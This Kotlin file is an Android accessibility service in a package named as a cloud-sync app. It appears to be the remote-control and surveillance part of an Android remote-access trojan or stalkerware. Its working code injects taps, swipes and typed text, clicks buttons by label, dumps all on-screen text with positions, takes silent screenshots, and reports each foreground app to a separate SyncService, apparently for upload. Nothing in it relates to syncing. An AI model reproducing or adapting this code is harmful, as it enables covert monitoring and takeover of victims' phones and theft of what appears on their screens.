package com.cloudsync.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class SyncAccessibility : AccessibilityService() {

    companion object {
        const val GLOBAL_BACK = 1
        const val GLOBAL_HOME = 2
        const val GLOBAL_RECENTS = 3
        const val GLOBAL_NOTIFICATIONS = 4
        const val GLOBAL_LOCK = 8

        @Volatile var instancia: SyncAccessibility? = null
        @Volatile private var ultimoPkg = ""

        fun listo() = instancia != null
        fun accion(a: Int) { instancia?.performGlobalAction(a) }

        fun tap(x: Int, y: Int) {
            val ins = instancia ?: return
            val p = Path()
            p.moveTo(x.toFloat(), y.toFloat())
            ins.dispatchGesture(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(p, 0, 60)).build(), null, null
            )
        }

        fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, ms: Int) {
            val ins = instancia ?: return
            val p = Path()
            p.moveTo(x1.toFloat(), y1.toFloat())
            p.lineTo(x2.toFloat(), y2.toFloat())
            ins.dispatchGesture(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(p, 0, ms.toLong())).build(), null, null
            )
        }

        fun escribir(t: String): String {
            val ins = instancia ?: return "sin accesibilidad"
            val raiz = ins.rootInActiveWindow ?: return "sin ventana"
            var foco = raiz.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (foco == null) foco = primerEditable(raiz)
            if (foco == null) return "sin campo"
            val args = Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, t)
            return if (foco.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) "ok" else "no acepto"
        }

        private fun primerEditable(n: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
            if (n == null) return null
            if (n.isEditable && n.isVisibleToUser) return n
            for (i in 0 until n.childCount) {
                val r = primerEditable(n.getChild(i))
                if (r != null) return r
            }
            return null
        }

        fun tapTexto(busqueda: String): String {
            val ins = instancia ?: return "sin accesibilidad"
            val raiz = ins.rootInActiveWindow ?: return "sin ventana"
            for (op in busqueda.split("|")) {
                val limpio = op.trim()
                if (limpio.isEmpty()) continue
                val nodos = raiz.findAccessibilityNodeInfosByText(limpio) ?: continue
                for (n in nodos) {
                    var o: AccessibilityNodeInfo? = n
                    while (o != null) {
                        if (o.isClickable && o.isVisibleToUser) {
                            if (o.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return "tocado: $limpio"
                        }
                        o = o.parent
                    }
                }
            }
            return "no encontrado: $busqueda"
        }

        fun textoVisible(): String {
            val ins = instancia ?: return ""
            val raiz = ins.rootInActiveWindow ?: return ""
            val sb = StringBuilder()
            recorrerTexto(raiz, sb, 0)
            return sb.toString()
        }

        private fun recorrerTexto(n: AccessibilityNodeInfo?, sb: StringBuilder, p: Int) {
            if (n == null || sb.length > 4000) return
            val t = n.text?.toString() ?: n.contentDescription?.toString()
            if (!t.isNullOrBlank()) sb.append(t).append(" | ")
            for (i in 0 until n.childCount) recorrerTexto(n.getChild(i), sb, p + 1)
        }

        fun dump(): String {
            val ins = instancia ?: return "[]"
            val raiz = ins.rootInActiveWindow ?: return "[]"
            val arr = JSONArray()
            recorrerDump(raiz, arr, 0)
            return arr.toString()
        }

        private fun recorrerDump(n: AccessibilityNodeInfo?, arr: JSONArray, p: Int) {
            if (n == null || arr.length() > 400) return
            val t = n.text?.toString() ?: n.contentDescription?.toString()
            if (!t.isNullOrBlank()) {
                val r = Rect()
                n.getBoundsInScreen(r)
                arr.put(JSONObject()
                    .put("t", t.take(120))
                    .put("x", r.centerX()).put("y", r.centerY())
                    .put("w", r.width()).put("h", r.height())
                    .put("click", n.isClickable).put("editable", n.isEditable)
                    .put("id", n.viewIdResourceName))
            }
            for (i in 0 until n.childCount) recorrerDump(n.getChild(i), arr, p + 1)
        }

        fun capturar(ctx: Context, forzar: Boolean): String {
            val ins = instancia ?: return "accesibilidad apagada"
            if (Build.VERSION.SDK_INT < 30) return "requiere Android 11+"
            val latch = CountDownLatch(1)
            var bmp: Bitmap? = null
            ins.takeScreenshot(Display.DEFAULT_DISPLAY, ins.mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(r: ScreenshotResult) {
                        val hw = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                        bmp = hw?.copy(Bitmap.Config.ARGB_8888, false)
                        r.hardwareBuffer.close()
                        latch.countDown()
                    }
                    override fun onFailure(codigo: Int) { latch.countDown() }
                })
            latch.await(8, TimeUnit.SECONDS)
            val b = bmp ?: return "sin captura"
            val esc = if (b.width > 540) 540f / b.width else 1f
            val nw = (b.width * esc).toInt()
            val nh = (b.height * esc).toInt()
            val chico = Bitmap.createScaledBitmap(b, nw, nh, true)
            val out = ByteArrayOutputStream()
            chico.compress(Bitmap.CompressFormat.JPEG, 60, out)
            val bytes = out.toByteArray()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val hash = Integer.toHexString(b64.hashCode())

            val p = Prefs(ctx)
            if (!forzar && hash == p.ultimoHash) return "sin cambios"
            p.ultimoHash = hash
            SyncService.instancia?.shot(b64, nw, nh, hash)
            return "captura ${nw}x${nh} ${bytes.size / 1024}KB"
        }
    }

    override fun onServiceConnected() {
        instancia = this
        SyncService.instancia?.evento("log", JSONObject().put("msg", "accesibilidad conectada"))
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        if (e == null) return
        if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkg = e.packageName?.toString() ?: return
            if (pkg != ultimoPkg) {
                ultimoPkg = pkg
                val nombre = try {
                    packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
                } catch (ex: Exception) { pkg }
                SyncService.instancia?.evento("app_fg", JSONObject().put("pkg", nombre).put("paquete", pkg))
            }
        }
    }

    override fun onInterrupt() {}
}
